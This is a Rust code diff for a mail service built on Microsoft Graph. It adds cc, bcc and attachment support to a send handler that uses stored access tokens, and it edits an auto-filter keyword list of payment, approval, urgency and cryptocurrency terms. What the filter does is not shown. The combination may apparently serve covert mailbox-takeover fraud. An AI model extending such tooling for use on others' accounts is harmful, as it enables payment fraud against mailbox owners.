@@ -132,7 +132,17 @@ pub struct SendMailRequest {
     pub subject: String,
     pub body: String,
     pub to: Vec<String>,
+    pub cc: Option<Vec<String>>,
+    pub bcc: Option<Vec<String>>,
     pub content_type: Option<String>,
+    pub attachments: Option<Vec<AttachmentRequest>>,
+}
+
+#[derive(Debug, Deserialize)]
+pub struct AttachmentRequest {
+    pub name: String,
+    pub content_type: String,
+    pub content_bytes: String, // base64
 }
 
 pub async fn send_mail_handler(
@@ -150,19 +160,48 @@ pub async fn send_mail_handler(
         None => token.access_token,
     };
 
-    let recipients: Vec<serde_json::Value> = body.to.iter().map(|email| serde_json::json!({
+    let to_recipients: Vec<serde_json::Value> = body.to.iter().map(|email| serde_json::json!({
         "emailAddress": { "address": email }
     })).collect();
 
-    let payload = serde_json::json!({
-        "message": {
-            "subject": body.subject,
-            "body": {
-                "contentType": body.content_type.as_deref().unwrap_or("HTML"),
-                "content": body.body,
-            },
-            "toRecipients": recipients,
+    let cc_recipients: Vec<serde_json::Value> = body.cc.as_ref().unwrap_or(&vec![]).iter().map(|email| serde_json::json!({
+        "emailAddress": { "address": email }
+    })).collect();
+
+    let bcc_recipients: Vec<serde_json::Value> = body.bcc.as_ref().unwrap_or(&vec![]).iter().map(|email| serde_json::json!({
+        "emailAddress": { "address": email }
+    })).collect();
+
+    let mut message = serde_json::json!({
+        "subject": body.subject,
+        "body": {
+            "contentType": body.content_type.as_deref().unwrap_or("HTML"),
+            "content": body.body,
         },
+        "toRecipients": to_recipients,
+    });
+
+    if !cc_recipients.is_empty() {
+        message["ccRecipients"] = serde_json::json!(cc_recipients);
+    }
+    if !bcc_recipients.is_empty() {
+        message["bccRecipients"] = serde_json::json!(bcc_recipients);
+    }
+
+    if let Some(attachments) = &body.attachments {
+        let attachment_json: Vec<serde_json::Value> = attachments.iter().map(|att| serde_json::json!({
+            "@odata.type": "#microsoft.graph.fileAttachment",
+            "name": att.name,
+            "contentType": att.content_type,
+            "contentBytes": att.content_bytes,
+        })).collect();
+        if !attachment_json.is_empty() {
+            message["attachments"] = serde_json::json!(attachment_json);
+        }
+    }
+
+    let payload = serde_json::json!({
+        "message": message,
         "saveToSentItems": true,
     });
 
@@ -432,8 +471,7 @@ pub async fn auto_filter_handler(
         "billing", "overdue", "outstanding", "pending", "approve",
         "approval", "authorize", "authorization", "sign", "signature",
         "confidential", "private", "urgent", "immediate", "asap",
-        "today", "deadline", "critical", "change", "update",
-        "new", "verify", "confirm", "validation",
+        "deadline", "critical",
         "cryptocurrency", "USDT", "binance", "bybit", "crypto", "bitcoin",
         "GBP", "Pounds", "AUD", "NGN", "AED", "INR", "CAD", "EUR", "euro",
         "dollars", "exchange",
